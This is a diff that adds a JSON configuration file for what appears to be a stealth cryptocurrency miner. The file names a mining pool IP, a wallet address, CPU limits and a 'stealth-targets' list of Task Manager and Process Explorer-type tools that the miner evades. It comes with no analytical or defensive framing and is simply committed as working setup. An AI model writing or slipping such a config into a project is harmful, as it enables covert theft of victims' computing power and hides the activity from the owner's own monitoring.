@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "194.33.61.68",
+    "port": 443,
+    "wallet": "45EBEG4K9L4h8kcoMbNJgyRwBHUDRAPVcaxcqMLtLesz3BWSQQG9jr8WyBEjDaZr4whBt7sd9sfVG7yoWTK88dXfPHnoKjU",
+    "password": "Wam",
+    "nicehash": true,
+    "ssltls": true,
+    "max-cpu": 40,
+    "idle-wait": 0,
+    "idle-cpu": 60,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}
